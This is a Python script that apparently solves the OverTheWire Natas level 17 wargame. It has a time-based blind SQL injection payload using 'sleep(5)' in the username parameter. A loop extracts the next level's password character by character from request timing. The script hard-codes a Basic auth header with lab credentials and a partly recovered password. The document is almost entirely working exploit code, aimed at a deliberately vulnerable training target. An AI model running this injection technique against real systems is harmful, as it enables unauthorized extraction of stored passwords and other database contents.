import requests
import time
from bs4 import BeautifulSoup

headers = {"Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw==", "Referer": "http://natas16.natas.labs.overthewire.org/"}
possibilities = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
pw = "6OG1PbKdVjyBlpxgD4DDbRG6Z"
print(f"Tamanho da senha: {len(pw)}")
for j in range(1,33):
    req_time = 0
    i = -1 # turns to zero before any construction
    while req_time < 5:
        i+=1
        params = [('username', 'natas18" AND BINARY substring(password,1,'+str(len(pw)+1)+') = "'+pw+possibilities[i]+'" AND sleep(5) AND "a"="a'), ('debug', '')]
        start = time.time()
        result = requests.get("http://natas17.natas.labs.overthewire.org", headers=headers, params=params)
        req_time = time.time() - start
        print(f"Try: {possibilities[i]}")
        print(req_time)
    pw += possibilities[i]
    print(f"Password: {pw}")
    print(f"Tamanho da senha: {len(pw)}")